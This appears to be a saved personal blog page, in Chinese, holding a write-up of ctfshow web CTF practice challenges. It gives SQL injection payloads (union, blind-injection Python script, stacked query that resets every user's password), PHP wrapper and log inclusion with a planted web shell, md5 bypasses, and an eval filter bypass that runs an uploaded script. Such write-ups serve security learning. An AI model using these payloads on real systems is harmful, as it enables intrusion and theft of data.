@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ctfshow练习 |  b1xcy&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ctfshow练习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctfshow练习
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/20/ctfshow%E7%BB%83%E4%B9%A0/" class="article-date">
+  <time datetime="2023-09-20T07:40:29.528Z" itemprop="datePublished">2023-09-20</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">5.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">27 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072204882.png" alt="image-20230407220424812"></p>
+<p>base64</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>是sql注入，但是没有回显，搞得挺恶心的，上sqlmap不知道为啥跑不出来</p>
+<p>这个报错是没有一点显示的，搞得最开始我都没弄清单双引号</p>
+<p>但本质上还是个简单的sql注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; or 1=1 #&amp;password=a</span><br></pre></td></tr></table></figure>
+
+<p>有显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072227003.png" alt="image-20230407222706982"></p>
+<p>order by 查到是3，联合注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,database(),3#&amp;password=a</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是，这里的回显位是2，必须把要查的东西放在第二位</p>
+<p>显示<code>web2</code></p>
+<p>爆库爆表爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;web2&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flag&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(flag),3 from web2.flag#&amp;password=a</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>有提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304121531657.png" alt="image-20230412153140585"></p>
+<p>那就是伪协议文件包含了，而且没有什么过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?=`cat ctf_go_go_go`;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>显示出flag</p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件包含考虑php伪协议，但是传值之后发现error报错，看了wp才知道又是日志包含</p>
+<p>（看了一眼过滤php和data）</p>
+<p>改个UA再发包，写个一句话木马连蚁剑</p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ctype_alpha()判断是否全字母，is_numeric()判断是否全数字，简单的md5绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>
+
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>唉，没有一点提示，过滤了or和空格。还把报错关了。试了一下才知道有三列，回显位在2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p>然后就是最傻逼的拼命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></table></figure>
+
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(flag)/**/from/**/web.flag#</span><br></pre></td></tr></table></figure>
+
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>用<code>-1/**/or/**/1=1/**/order/**/by/**/3</code>测出来有三段</p>
+<p>但是禁用了union关键字，那就只能用盲注了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://e3406b2c-d1a2-4d95-9939-2b3b5e00d525.challenge.ctf.show/&#x27;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 80):</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br><span class="line">        test = s.get(url = url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line">        if &#x27;I asked nothing&#x27; in test:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br></pre></td></tr></table></figure>
+
+<p>唉，phpmyadmin真是傻逼，乱切换数据库。跑测试的时候弄了好久，还得是Navicat</p>
+<p>NP，启动！</p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>呃呃，脑残是不。啥提示没有，试了个<code>ffifdyop</code>给我弹flag了，也不提示我md5</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点击取消弹出来个index.phps，打开查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里直接用的strlen来判断，那么双写就绕过不了了。还把union select禁用了，那quine注入也用不了</p>
+<p>本来是想着使用堆叠注入。在后面堆叠插入一条新的数据。但由于使用的是mysqli_query函数，更没法堆叠注入。<code>堆叠注入要求使用mysqli_multi_query函数</code>，只有这个函数能一次性执行多条语句</p>
+<p>看似是没什么思路了，看了一下别人的wp才知道还有一种方法也能构造出多一条数据</p>
+<blockquote>
+<p>GROUP BY 会根据每条password的值进行判断。如果结合SUM等函数，就可以做到让password相同的值所对应的其他列内容进行SUM等操作</p>
+<p>至于 WITH ROLLUP，它是一种用于在 GROUP BY 子句中添加汇总行的选项。它会在结果中添加一个额外的行，该行包含了所有分组的聚合结果。同上，如果进行了SUM操作，就会把所有的值都SUM起来</p>
+</blockquote>
+<p>例:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220951780.png" alt="image-20230922095013228"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `password`,SUM(`username`) FROM users GROUP BY `password`</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220957193.png" alt="image-20230922095727165"></p>
+<p>而如果加上rollup，就会多处一列，再次进行SUM的汇总操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220958495.png" alt="image-20230922095822472"></p>
+<p>而此时，password这一栏会显示NULL</p>
+<p>这个题就是利用了这个点，产生了一条password&#x3D;Null的数据。而这时在POST中传入null就可echo出flag</p>
+<blockquote>
+<p>再补充一下堆叠注入的办法吧，虽然在这题用不了，但谁知道以后呢。只适用于mysqli_multi_query</p>
+<p>使用多条sql语句，并用;分割执行。本质上是堆叠+二次注入</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;1;;INSERT INTO `user`.`users` (`password`, `username`) VALUES (&#x27;test&#x27;, &#x27;test&#x27;);;UPDATE users SET password = &#x27;done&#x27;;UPDATE users SET username = &#x27;done&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>这样一来就把所有的用户名和对应的密码都设置为done了</p>
+</blockquote>
+<h2 id="wb11"><a href="#wb11" class="headerlink" title="wb11"></a>wb11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这题也是出的云里雾里的，跟数据库一点关系没有</p>
+<p>$password实际上是get传参进来的，和session[‘password’]进行比较</p>
+<p>如果两个都为空即可绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309221311017.png" alt="image-20230922131119973"></p>
+<p>删掉password的赋值和Cookie</p>
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>F12给出hit:?cmd&#x3D;</p>
+<p>尝试多次之后发现传入phpinfo();可以成功回显，思路就是直接查文件。但是一看phpinfo里能用的函数基本全给我ban了，直接用命令的方法也不会是很ok</p>
+<p>这时候就要想到php原生类了。结合我之前做的笔记，直接Globlterator+SplFileObject开查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$context = new SplFileObject(&#x27;/var/www/html/903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#x27;);foreach($context as $f)&#123;</span><br><span class="line">echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>唉，看了别的师傅wp，还有更简单的函数highlight_file，直接秒了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p>给cmd随便穿了个东西就弹出源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">            </span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可见，能用的有 p &#x3D; + ; . ? &lt; &gt; &#96; \</p>
+<p>想不明白直接找资料</p>
+<blockquote>
+<p>php的上传接受multipart&#x2F;form-data，然后会将它保存在临时文件中。php.ini中设置的<code>upload_tmp_dir</code>就是这个临时文件的保存目录。linux下默认为<code>/tmp</code>。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
+</blockquote>
+<p>基本思路就是上传，然后用eval+&#96;+?+.去模糊匹配执行（.&#x3D;source，source一个文件相当于把每行的命令依次执行一次）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222041842.png" alt="image-20230922204150800"></p>
+<p>那就是要先完成文件上传，直接让chatgpt给就行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg, .jpeg, .png, .gif&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;uploadFile()&quot;</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;response&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> responseDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;response&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (fileInput.<span class="property">files</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;请选择一个文件&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">        formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://your-upload-url.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件上传失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这时候直接向&#x2F;index.php?cmd&#x3D;?&gt;&lt;?&#x3D;`.+&#x2F;??p&#x2F;p?p??????`;上传test.txt，内容是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>就可以弹出flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222118039.png" alt="image-20230922211835007"></p>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>唉，也是脑残。源码在upload.php.bak</p>
